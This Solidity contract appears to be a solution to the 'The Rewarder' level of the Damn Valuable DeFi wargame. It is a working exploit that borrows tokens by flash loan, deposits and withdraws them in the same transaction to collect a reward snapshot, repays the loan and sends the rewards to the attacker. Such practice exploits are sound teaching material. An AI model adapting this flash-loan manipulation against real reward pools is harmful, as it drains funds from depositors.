//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackRewarder {
    address payable owner;
    FlashLoanerPool pool;
    TheRewarderPool rewardPool;
    DamnValuableToken DVT;
    RewardToken rewardToken;

    constructor(
        address payable _owner,
        address _pool,
        address _rewardPool,
        address _DVT,
        address _rewardToken
    ) {
        owner = _owner;
        pool = FlashLoanerPool(_pool);
        rewardPool = TheRewarderPool(_rewardPool);
        DVT = DamnValuableToken(_DVT);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner);
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        //deposit to rewarder pool
        DVT.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        //deposit the loan back to the pool
        DVT.transfer(address(pool), amount);

        //transfer reward token to attacker
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
